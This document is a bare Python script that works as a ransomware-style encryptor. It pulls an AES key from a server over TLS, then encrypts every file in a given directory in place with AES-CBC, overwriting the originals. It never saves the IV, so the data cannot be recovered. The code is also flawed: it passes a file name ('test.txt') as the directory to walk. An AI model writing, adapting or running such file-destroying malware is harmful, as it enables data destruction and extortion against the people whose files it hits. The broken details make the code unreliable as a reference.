import socket
import ssl
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

def get_secret_key(server_address, server_port):
    context = ssl.create_default_context()
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    secure_socket = context.wrap_socket(client_socket, server_hostname=server_address)
    secure_socket.connect((server_address, server_port))
    secret_key = secure_socket.recv(16)
    secure_socket.close()
    return secret_key

def encrypt_file(file_path, secret_key):
    cipher = AES.new(secret_key, AES.MODE_CBC)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    padded_data = pad(file_data, AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def encrypt_all_files(directory, secret_key):
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        encrypt_file(file_path, secret_key)

directory = 'test.txt'
server_address = 'localhost'
server_port = 9999
secret_key = get_secret_key(server_address, server_port)
encrypt_all_files(directory, secret_key)
